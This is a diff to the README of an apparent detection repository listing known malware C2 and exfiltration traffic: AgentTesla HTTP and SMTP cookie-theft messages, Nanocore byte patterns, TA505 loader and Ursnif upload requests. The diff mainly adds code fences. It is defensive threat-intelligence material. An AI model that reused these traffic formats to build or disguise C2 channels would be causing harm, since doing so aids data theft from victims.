@@ -1,7 +1,7 @@
 ### A repo for matching on known c2 and exfil traffic keywords (ctrl+f to search)
 
 #### AgentTesla http:
-
+~~~
 POST /zin/WebPanel/api.php HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
 Content-Type: application/x-www-form-urlencoded
@@ -13,18 +13,17 @@ Connection: Keep-Alive
 HTTP/1.1 100 Continue
 
 p=G1DZYwdIiDZ6V83seaZCmTT0wiCyOlXVS0OEx4YpkUAOuKO/6hfQJ%2BZD2LjpTbyu9w0gudjYXCIc0Ul74wtsvtqYLYuTR%2BlFVl%2B5deG0RnTTo6nFc1M9tx0%2BRo7WXetRdIHkmVMMSeqH%2BEroM7yttDzosvKfKgB%2BJ07oqT/YvQ6CPNW2%2BCETCU6oIlO9XYyrEy6/hYeF%2BgkfRc9xSEfZhh/7Wk0khJ4zZJ3cjEvXDxJcQWA739/yDUy4kOAndihYsWnLw1mVCHxJSJf7%2BguB9f4DpgX10NLpH
-
+~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-http.png "AgentTesla HTTP")
 
 #### AgentTesla smtp exil:
-
+~~~
 From: office@larbaxpo[.]com
 To: officelogs@larbaxpo[.]com
 Date: 9 Oct 2019 17:58:19 +0100
 Subject: admin/USER-PC Recovered Cookies
 Content-Type: multipart/mixed;
  boundary=--boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7
-
 
 ----boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7
 Content-Type: text/html; charset=us-ascii
@@ -34,32 +33,32 @@ Time: 10/09/2019 17:58:13<br>UserName: admin<br>ComputerName: USE=
 R-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Int=
 el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 3583.61 MB<br>IP: 18=
 5.183.107.236=0A<hr>
-
+~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-submission.png "AgentTesla Submission")
 
 #### Nanocore
 
 flag on "38 00 00 00 17" pattern
-
+~~~
 00000000  38 00 00 00 17 f5 4b 2c  c3 65 ca 9f eb bc fd 67   8.....K, .e.....g
 00000010  ad 6d 0e c4 33 7d b6 40  17 17 97 a1 d9 7c 3c b3   .m..3}.@ .....|<.
 00000020  04 ea d0 16 f2 cf 3e 51  29 18 55 e5 1c 7a 6a 91   ......>Q ).U..zj.
 00000030  03 99 38 f7 ac 3b f7 89  85 2e c4 d8               ..8..;.. ....
-
+~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-38.png "Nanocore 38")
 
 flag on "40 00 00 00 17" pattern:
-
+~~~
 00000000  40 00 00 00 17 f5 4b 2c  c3 65 ca 9f eb bc fd 67   @.....K, .e.....g
 00000010  ad 6d 0e c4 33 7d b6 40  17 17 97 a1 d9 7c 3c b3   .m..3}.@ .....|<.
 00000020  04 ea d0 16 87 30 8f fa  78 9d 2a 01 c2 51 ee 07   .....0.. x.*..Q..
 00000030  bd e7 23 95 3e ab a1 04  ca 56 b3 fb b7 9b b7 3a   ..#.>... .V.....:
 00000040  13 e5 2b 52                                        ..+R
-
+~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-40.png "Nanocore 40")
 
 #### TA505 Loder:
-
+~~~
 POST /2021 HTTP/1.1
 Connection: Keep-Alive
 Content-Type: application/x-www-form-urlencoded
@@ -72,11 +71,11 @@ Server: nginx/1.10.3
 Date: Wed, 09 Oct 2019 18:53:18 GMT
 Content-Length: 0
 Connection: keep-alive
-
+~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ta505-loader.png "TA505 Loader")
 
 #### Ursnif:
-
+~~~
 POST /images/wsF0B4sp/ZaYjjdVgt73Q1BSOy_2Fofi/qF_2BfPTuK/5Ha_2F0xEvmbSfT_2/FluJ8ZF_2Fx8/g6xkZAZrZwN/2skHgzv92i_2BS/uPf4RDQvATKCgx0GZ5gez/ph_2BLcscLQkKDVw/HGZ6zA6DhGCqgPD/VTX09Q_2FUWIFyWps1/nfJ0I3rIZ/QNKbXjeu7xXa3W_2FZSX/bcWtE2zC4RafXFoRlqL/4EC4YHwclzkXrfX/58a3.bmp HTTP/1.1
 Cache-Control: no-cache
 Connection: Keep-Alive
@@ -91,5 +90,5 @@ Content-Disposition: form-data; name="upload_file"; filename="78C6.bin"
 
 \.\..V.]:.o..<]......H..)E.J=x...e%3..U.@.f......].tZ..1....g..OzC.5v.?o.NL...;..)..E.G.a~.....M#;.Cu;N/.3\$....x.....R....e..5.....-mW,..	..C................n.G.|..k0...@...?I.Iu......9k^.U6tzT9.b.3....#..V.4].La....zL.h+...aa..H.D.....Ar.......3.w.<.!.-.....|F9! 3.....7
 --36775038942641984568--
-
+~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ursnif.png "Ursnif POST")
